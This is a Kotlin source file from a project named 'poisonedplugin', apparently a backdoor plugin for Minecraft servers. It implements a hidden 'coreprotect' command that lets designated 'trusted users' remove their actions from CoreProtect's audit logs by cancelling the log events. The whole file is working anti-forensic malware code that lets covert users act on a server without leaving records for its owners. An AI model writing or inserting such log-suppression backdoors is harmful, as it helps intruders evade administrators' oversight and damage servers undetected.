/*
 * MIT License
 *
 * Copyright (c) 2023 Max Bossing
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */
package de.maxbossing.poisonedplugin.module.coreprotect

import de.maxbossing.poisonedplugin.instance
import de.maxbossing.poisonedplugin.manager.TrustedUserManager
import de.maxbossing.poisonedplugin.manager.command
import de.maxbossing.poisonedplugin.utils.cmp
import net.coreprotect.event.CoreProtectPreLogEvent
import net.kyori.adventure.text.format.NamedTextColor
import org.bukkit.Bukkit
import org.bukkit.event.EventHandler
import org.bukkit.event.EventPriority
import org.bukkit.event.Listener
import java.util.UUID

object CoreProtectModule: Listener {

    val vanishedUsers = mutableListOf<UUID>()

    @EventHandler(priority = EventPriority.LOWEST)
    fun onPreLog(event: CoreProtectPreLogEvent) {

        if (!TrustedUserManager.trustedUsers.contains((Bukkit.getPlayer(event.user)?:return).uniqueId))return

        if (!vanishedUsers.contains((Bukkit.getPlayer(event.user)?:return).uniqueId))return

        event.isCancelled = true
    }

    val coreProtectAPI = command("coreprotect", "Manages CoreProtect-related modules") {player, args ->
        if (args.isEmpty()) {
            player.sendMessage(cmp("#coreprotect <vanish | unvanish>", NamedTextColor.RED))
            return@command
        }
        when (args[0]) {
            "vanish" -> {
                vanishedUsers.add(player.uniqueId)
                player.sendMessage(cmp("Vanished from future CoreProtect Logs"))
            }
            "unvanish" -> {
                player.sendMessage(cmp("Unvanished from future CoreProtect Logs"))
                vanishedUsers.remove(player.uniqueId)
            }
        }
    }

    init {
        Bukkit.getPluginManager().registerEvents(this, instance)
    }
}